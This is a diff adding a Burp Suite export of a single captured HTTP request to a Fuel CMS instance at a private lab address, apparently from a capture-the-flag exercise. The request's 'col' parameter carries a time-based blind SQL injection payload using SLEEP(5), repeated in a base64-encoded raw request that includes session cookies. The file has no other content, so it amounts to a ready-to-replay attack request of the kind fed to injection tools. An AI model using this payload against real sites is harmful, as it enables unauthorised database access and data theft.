@@ -1,0 +1,42 @@
+<?xml version="1.0"?>
+<!DOCTYPE items [
+<!ELEMENT items (item*)>
+<!ATTLIST items burpVersion CDATA "">
+<!ATTLIST items exportTime CDATA "">
+<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
+<!ELEMENT time (#PCDATA)>
+<!ELEMENT url (#PCDATA)>
+<!ELEMENT host (#PCDATA)>
+<!ATTLIST host ip CDATA "">
+<!ELEMENT port (#PCDATA)>
+<!ELEMENT protocol (#PCDATA)>
+<!ELEMENT method (#PCDATA)>
+<!ELEMENT path (#PCDATA)>
+<!ELEMENT extension (#PCDATA)>
+<!ELEMENT request (#PCDATA)>
+<!ATTLIST request base64 (true|false) "false">
+<!ELEMENT status (#PCDATA)>
+<!ELEMENT responselength (#PCDATA)>
+<!ELEMENT mimetype (#PCDATA)>
+<!ELEMENT response (#PCDATA)>
+<!ATTLIST response base64 (true|false) "false">
+<!ELEMENT comment (#PCDATA)>
+]>
+<items burpVersion="2021.6.2" exportTime="Mon Jun 28 23:12:04 GST 2021">
+  <item>
+    <time>Mon Jun 28 23:11:19 GST 2021</time>
+    <url><![CDATA[http://10.10.122.235/fuel/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(5)))ULQV)&fuel_inline=0]]></url>
+    <host ip="10.10.122.235">10.10.122.235</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/fuel/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(5)))ULQV)&fuel_inline=0]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9mdWVsL3BhZ2VzL2l0ZW1zLz9zZWFyY2hfdGVybT0mcHVibGlzaGVkPSZsYXlvdXQ9JmxpbWl0PTUwJnZpZXdfdHlwZT1saXN0Jm9mZnNldD0wJm9yZGVyPWFzYyZjb2w9bG9jYXRpb24rQU5EKyhTRUxFQ1QrMTM0MCtGUk9NKyhTRUxFQ1QoU0xFRVAoNSkpKVVMUVYpJmZ1ZWxfaW5saW5lPTAgSFRUUC8xLjENCkhvc3Q6IDEwLjEwLjEyMi4yMzUNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwLjE0OyBydjo4OS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94Lzg5LjANCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQ29ubmVjdGlvbjogY2xvc2UNCkNvb2tpZTogY2lfc2Vzc2lvbj1ibXZ0aWMzN3ZmdWI5c2FubzY0OWVqNGRrY3FidXAwbzsgZnVlbF83ZGE1MTU0NDNhODJmY2FjZjE1ZDc0Yzc2NmY0YjM0Yj1hJTNBMiUzQSU3QnMlM0EyJTNBJTIyaWQlMjIlM0JzJTNBMSUzQSUyMjElMjIlM0JzJTNBOCUzQSUyMmxhbmd1YWdlJTIyJTNCcyUzQTclM0ElMjJlbmdsaXNoJTIyJTNCJTdEOyBmdWVsX3VpXzdkYTUxNTQ0M2E4MmZjYWNmMTVkNzRjNzY2ZjRiMzRiPSUyNTdCJTI1MjJsZWZ0bmF2X2gzJTI1MjIlMjUzQSUyNTIyMCUyNTdDMCUyNTdDMCUyNTdDMCUyNTIyJTI1MkMlMjUyMnRhYnNfYXNzZXRzX2NyZWF0ZSUyNTIyJTI1M0ElMjUyMjAlMjUyMiUyNTJDJTI1MjJmdWVsX3BhZ2VzX2l0ZW1zJTI1MjIlMjUzQSUyNTIybGlzdCUyNTIyJTI1MkMlMjUyMmxlZnRuYXZfaGlkZSUyNTIyJTI1M0ElMjUyMjAlMjUyMiUyNTJDJTI1MjJmdWVsX3Blcm1pc3Npb25zX2l0ZW1zJTI1MjIlMjUzQSUyNTIybGlzdCUyNTIyJTI1MkMlMjUyMmZ1ZWxfbmF2aWdhdGlvbl9pdGVtcyUyNTIyJTI1M0ElMjUyMmxpc3QlMjUyMiUyNTdEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQoNCg==]]></request>
+    <status></status>
+    <responselength></responselength>
+    <mimetype></mimetype>
+    <response base64="true"></response>
+    <comment></comment>
+  </item>
+</items>
